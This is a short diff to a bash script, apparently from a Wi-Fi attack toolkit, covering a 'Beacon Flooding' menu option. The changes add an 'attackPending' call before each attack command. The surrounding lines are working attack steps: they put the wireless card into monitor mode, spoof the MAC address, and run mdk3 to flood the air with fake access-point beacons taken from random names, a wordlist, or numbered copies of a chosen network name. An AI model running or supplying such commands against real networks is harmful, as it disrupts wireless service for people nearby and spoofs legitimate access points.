@@ -17,11 +17,13 @@ elif [[ "$SO" == "2" ]]; then # Beacon Flooding
   if [[ "$SO" == "1" ]]; then   # Random
     changeWImode monitor
     changeMac
+    attackPending
     mdk3 $WI b -f "$folder/wordlist.txt" -a -s 1000
   elif [[ "$SO" == "2" ]]; then # Wordlist
     getInput "Wordlist File" "Enter Wordlist Path." "/root/desktop/wordlist.txt"
     changeWImode monitor
     changeMac
+    attackPending
     mdk3 $WI b -f "$SI" -a  -s 1000
   elif [[ "$SO" == "3" ]]; then # Specific
     getInput "Network Name" "Type a string" "xPWNEDx"
@@ -33,6 +35,7 @@ elif [[ "$SO" == "2" ]]; then # Beacon Flooding
       echo $string $COUNT >> "$folder/$string.txt"
       let COUNT=COUNT+1
     done
+    attackPending
     mdk3 $WI b -f "$folder/$string.txt" -a  -s 1000 && rm "$folder/$string.txt"
     # mdk3 $WI b -n "$string"-a  -s $N
     # mdk3 wlan0 b -n FreeWifi -m
